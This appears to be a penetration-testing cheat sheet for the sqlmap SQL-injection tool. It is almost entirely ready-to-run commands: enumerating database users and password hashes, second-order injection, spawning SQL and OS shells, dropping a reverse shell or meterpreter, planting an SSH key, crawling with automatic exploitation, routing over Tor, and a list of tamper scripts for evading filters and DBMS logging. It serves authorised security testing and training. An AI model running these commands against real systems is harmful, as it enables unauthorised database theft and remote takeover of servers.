---
description: sqlmap.py
---

# SQLMap

### **Basic arguments for SQLmap**

```text
sqlmap --url="<url>" 
-p username 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--level=5
--risk=3  
--eta 
--dbms=MySQL 
--os=Linux 
--banner 
--is-dba 
--users 
--passwords 
--current-user 
--dbs
```

> 1. `-u URL, --url=URL`   Target URL \(e.g. "http://www.site.com/vuln.php?id=1"\)
> 2. `-p TESTPARAMETER`     Testable parameter\(s\)
> 3. By default sqlmap performs HTTP requests with the following `User-Agent` header value:
>
>    ```text
>    sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
>    ```
>
>    However, it is possible to fake it with the option `--user-agent` by providing custom User-Agent as the option's argument.
>
> 4. `--random-agent`, sqlmap will randomly select a `User-Agent` from the `./txt/user-agents.txt`
> 5. `--threads=THREADS`   Max number of concurrent HTTP\(s\) requests \(default 1\)
> 6. `--level=LEVEL`            Level of tests to perform \(1-5, default 1\) 
> 7. `--risk=RISK`               Risk of tests to perform \(1-3, default 1\)
> 8. `--eta`                            Display for each output the estimated time of arrival
> 9. `--dbms=DBMS`                Force back-end DBMS to provided value
> 10. `--os=OS`                        Force back-end DBMS operating system to provided value
> 11. `-b, --banner`              Retrieve DBMS banner
> 12.  `--is-dba`                     Detect if the DBMS current user is DBA
> 13. `--users`                        Enumerate DBMS users
> 14. `--passwords`                Enumerate DBMS users password hashes
> 15. `--current-user`          Retrieve DBMS current user
> 16. `--dbs`                            Enumerate DBMS databases

### Load a request file and use mobile user-agent

```text
sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
```

> * `-r REQUESTFILE`                     Load HTTP request from a file
> * `--safe-url=SAFEURL`             URL address to visit frequently during testing
> * `--mobile`                                  Imitate smartphone through HTTP User-Agent header
> * `--safe-freq=SAFE..`             Regular requests between visits to a safe URL

### Custom injection in UserAgent/Header/Referer/Cookie

```text
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```

> * `-u URL, --url=URL`                   Target URL \(e.g. "http://www.site.com/vuln.php?id=1"\)
> * `--data=DATA`                                Data string to be sent through POST \(e.g. "id=1"\)
> * `--headers=HEADERS`                    Extra headers \(e.g. "Accept-Language: fr\nETag: 123"\)
> * The injection is located at the '\*'

### Second-order attack

Options: `--second-url` and `--second-req`

Second-order SQL injection attack is an attack where result\(s\) of an injected payload in one vulnerable page is shown \(reflected\) at the other \(e.g. frame\). Usually that's happening because of database storage of user provided input at the original vulnerable page.

You can manually tell sqlmap to test for this type of SQL injection by using option `--second-order` with the URL address or `--second-req` with request file for sending to the server where results are being shown.

```text
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3

sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

### Shell

```text
SQL Shell
python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell

Simple Shell
python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell

Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn

SSH Shell by dropping an SSH key
python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
```

### Crawl a website with SQLmap and auto-exploit

```text
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

> * `--batch` = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
> * `--crawl` = how deep you want to crawl a site
> * `--forms` = Parse and test forms

### TOR

```text
sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```

### Proxy

```text
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
```

### Cookie and a Proxy

```text
sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
```

### Using suffix to tamper the injection

```text
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### General tamper option 

```text
tamper=name_of_the_tamper
```

### Tamper list

| Tamper | Description |
| :--- | :--- |
| 0x2char.py | Replaces each \(MySQL\) 0x encoded string with equivalent CONCAT\(CHAR\(\),…\) counterpart |
| apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
| apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart |
| appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
| base64encode.py | Base64 all characters in a given payload |
| between.py | Replaces greater than operator \('&gt;'\) with 'NOT BETWEEN 0 AND \#' |
| bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator |
| chardoubleencode.py | Double url-encodes all characters in a given payload \(not processing already encoded\) |
| charencode.py | URL-encodes all characters in a given payload \(not processing already encoded\) \(e.g. SELECT -&gt; %53%45%4C%45%43%54\) |
| charunicodeencode.py | Unicode-URL-encodes all characters in a given payload \(not processing already encoded\) \(e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054\) |
| charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload \(not processing already encoded\) \(e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054\) |
| commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' |
| commalessmid.py | Replaces instances like 'MID\(A, B, C\)' with 'MID\(A FROM B FOR C\)' |
| commentbeforeparentheses.py | Prepends \(inline\) comment before parentheses \(e.g. \( -&gt; /\*\*/\(\) |
| concat2concatws.py | Replaces instances like 'CONCAT\(A, B\)' with 'CONCAT\_WS\(MID\(CHAR\(0\), 0, 0\), A, B\)' |
| charencode.py | Url-encodes all characters in a given payload \(not processing already encoded\) |
| charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload \(not processing already encoded\) |
| equaltolike.py | Replaces all occurrences of operator equal \('='\) with operator 'LIKE' |
| escapequotes.py | Slash escape quotes \(' and "\) |
| greatest.py | Replaces greater than operator \('&gt;'\) with 'GREATEST' counterpart |
| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword |
| htmlencode.py | HTML encode \(using code points\) all non-alphanumeric characters \(e.g. ‘ -&gt; '\) |
| ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL\(A, B\)’ with ‘CASE WHEN ISNULL\(A\) THEN \(B\) ELSE \(A\) END’ counterpart |
| ifnull2ifisnull.py | Replaces instances like 'IFNULL\(A, B\)' with 'IF\(ISNULL\(A\), B, A\)' |
| informationschemacomment.py | Add an inline comment \(/\*\*/\) to the end of all occurrences of \(MySQL\) “information\_schema” identifier |
| least.py | Replaces greater than operator \(‘&gt;’\) with ‘LEAST’ counterpart |
| lowercase.py | Replaces each keyword character with lower case value \(e.g. SELECT -&gt; select\) |
| modsecurityversioned.py | Embraces complete query with versioned comment |
| modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
| multiplespaces.py | Adds multiple spaces around SQL keywords |
| nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement \(e.g. .replace\("SELECT", ""\)\) filters |
| overlongutf8.py | Converts all characters in a given payload \(not processing already encoded\) |
| overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 \(not processing already encoded\) \(e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94\) |
| percentage.py | Adds a percentage sign \('%'\) infront of each character |
| plus2concat.py | Replaces plus operator \(‘+’\) with \(MsSQL\) function CONCAT\(\) counterpart |
| plus2fnconcat.py | Replaces plus operator \(‘+’\) with \(MsSQL\) ODBC function {fn CONCAT\(\)} counterpart |
| randomcase.py | Replaces each keyword character with random case value |
| randomcomments.py | Add random comments to SQL keywords |
| securesphere.py | Appends special crafted string |
| sp\_password.py | Appends 'sp\_password' to the end of the payload for automatic obfuscation from DBMS logs |
| space2comment.py | Replaces space character \(' '\) with comments |
| space2dash.py | Replaces space character \(' '\) with a dash comment \('--'\) followed by a random string and a new line \('\n'\) |
| space2hash.py | Replaces space character \(' '\) with a pound character \('\#'\) followed by a random string and a new line \('\n'\) |
| space2morehash.py | Replaces space character \(' '\) with a pound character \('\#'\) followed by a random string and a new line \('\n'\) |
| space2mssqlblank.py | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters |
| space2mssqlhash.py | Replaces space character \(' '\) with a pound character \('\#'\) followed by a new line \('\n'\) |
| space2mysqlblank.py | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters |
| space2mysqldash.py | Replaces space character \(' '\) with a dash comment \('--'\) followed by a new line \('\n'\) |
| space2plus.py | Replaces space character \(' '\) with plus \('+'\) |
| space2randomblank.py | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters |
| symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts \(&& and |
| unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
| unmagicquotes.py | Replaces quote character \('\) with a multi-byte combo %bf%27 together with generic comment at the end \(to make it work\) |
| uppercase.py | Replaces each keyword character with upper case value 'INSERT' |
| varnish.py | Append a HTTP header 'X-originating-IP' |
| versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
| versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
| xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For' |

### SQLmap without SQL injection

You can use SQLmap to access a database via its port instead of a URL.

```text
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
```

